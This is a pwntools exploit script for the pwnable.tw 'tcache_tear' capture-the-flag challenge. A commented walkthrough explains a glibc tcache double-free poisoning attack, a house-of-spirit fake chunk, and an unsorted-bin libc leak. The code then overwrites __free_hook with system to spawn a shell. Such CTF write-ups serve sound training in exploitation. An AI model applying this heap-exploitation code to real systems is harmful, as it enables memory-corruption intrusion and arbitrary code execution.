#!/usr/bin/env python3
from pwn import *
from sys import argv
"""steps

tcache tear
===========================
1. double free - write what where ; write into bss section since no PIE
2. construct fake chunk - house of spirit
3. free fake to leak libc
4. write what where vuln over hook, and call malloc and or free to gain shell

remote server does not have glibc 2.27 key? is this the old 2.27??
it seems as though we do not need to overwrite any key to main tcache perthread structure so it should
be a bit easier :)

double free works as such, we will free a an mchunkptr twice, so there will be 2 entries to the same chunk
if we are to malloc a chunk of fitting size for tcache, we will gain a pointer to a chunk still within
the tcache freelist. Of course, tcache_get() will remove the metadata and null the pointers, but the
second tcache_get() has no idea.


      0xdeadbeef  <-- same chunk in the tcache freelist!
          |
   +------+-------+
   V              V
[entry][fd] -> [entry][fd] -> NULL;


So if we are to remove an entry from this lifo singly linked list, we will see this scenario:


      0xdeadbeef  <-- same chunk in the tcache freelist!
          |
  +-------+-------+
  V               V
[entry][fd] -> NULL;
   Λ
   |
   +----------+     They will point to each other, remember that they are the same chunk!
              |
              |
              V
[metadata][mchunkptr]


since the next* pointer will be the first value within the tcache, all we have to do is simply fill in
our "user" data with an address we want to be returned by malloc. Again, something that should be
noted is that these caching bins do not *literally* cache the chunks within bins. They simply hold
pointers to chunks, for fast retrieval from malloc.

Here is the state of the tcache after we have overwritten the next pointer of the tcache entry that
still resides within the tcache freelist.


      0xdeadbeef
          |
   +------+
   V
[entry][fd] -> 0xcafebabe;
   Λ
   |
   +----------+     They will point to each other, remember that they are the same chunk!
              |
              |
              V
[metadata][0xcafebabe]


as we can see, the chunk within the tcache's next pointer has been overwritten with the address we
want malloc to return to us, 0xcafebabe. Lets malloc another chunk of similar size, and see what happens


0xcafebabe;

[metadata][0xcafebabe]


the pointer to next is now within the tcache, if we are to malloc ANOTHER chunk of similar size, then
malloc will return a pointer to 0xcafebabe, which will possibly provide us with a read write what where
depending on how much access the program gives us.

We can leverage this vulnerability to construct our fake chunk within the bss section, as PIE is off.

This is technically a tcache poisoning attack right?

Next, in order to leak an address of libc, we must leverage the doubly linked list caching mechanism that
is the unsorted bin. This took me an embarrassing long time to figure out, but thanks to these resources
i was able to complete :).

https://faraz.faith/2019-10-20-secconctf-2019-one/
https://guyinatuxedo.github.io/31-unsortedbin_attack/0ctf16_zerostorage/index.html

if anything here was wrong, then please help me clear up any misconceptions @ manjoos#0745 on discord :D
"""
binary=ELF("./tcache_tear",checksec=False)
libc=ELF("./libc.so.6",checksec=False)
context(arch='amd64',os='linux',log_level='DEBUG')
if len(argv)>1 and argv[1]=="-r":
    p=remote("chall.pwnable.tw",10207)
else:
    p=remote("2-27.box",9999)
## helper functions
s=lambda x,r=":":p.sendlineafter(r,x)if r else p.sendline(x)
malloc=lambda sz,d: ( s("1","choice :"), s(str(sz)), s(d) )
free=lambda:s("2","choice :" )
info=lambda:s("3","choice :")
exit=lambda:s("4","choice :")
def www(src,dest,sz): # write what where thanks to double free + tcache next ptr poisoning
    malloc(sz,"A"*sz)
    free()
    free() # 2 entries within tcache, points to same chunk
    malloc(sz,p64(dest)) # overwrite next
    malloc(sz,p64(0))    # remove from list, this is junk as we have already poisoned
    malloc(sz,src)       # desired pointer returned by tcache, write what we want, where we want :)
s("oiahfiopwh0oah0ow","Name:")
www(
# mchunk_prev_size mchunk_size fd bk fd_nextsize bk_nextsize
# idk if 0x21 as metadata will bork out, does not match size, therefore may cause issues, too lazy to dbg
    p64(0)+p64(0x21)+p64(0)*3 +p64(0x21), # fake chunk - tcache house of spirit
    0x602550,                        # 0x0000000000602020 - 0x0000000000602090 is .bss
    112                              # chunk size
)
www( # unsorted bin metadata!!
    p64(0)+p64(1281)+p64(0)*5+p64(0x602060), # fake_chunk[2]
    0x602050,                        # dest
    96
)
free() # free our fake chunk
info() # print leak
p.recvuntil(b"Name :")
# recv 6 since libc addr contain 2 non printable null. Important juicy stuff only 6 bytes.
base=int.from_bytes(p.recv(6),"little")-0x3ebca0 # find unsorted bin offset by dbg locally
free_hook=libc.symbols['__free_hook']+base
system   =libc.symbols['system']+base
log.info("Leaked base address of libc: %s"%hex(base))
log.info("Calculated address of system: %s"%hex(system))
log.info("Calculated address of __free_hook: %s"%hex(free_hook))
#p.interactive()

malloc(0x40,"AAAAAA")
#p.interactive()
free()
free()
malloc(0x40,p64(free_hook))
malloc(0x40,"ajfpowjpo")
malloc(0x40,p64(system))
# overwrite hook and execute free ; different tcache idx since we've trashed the tcache :/
malloc(24,b"/bin/sh\x00")
free()
free()
context.log_level='error'
p.interactive()
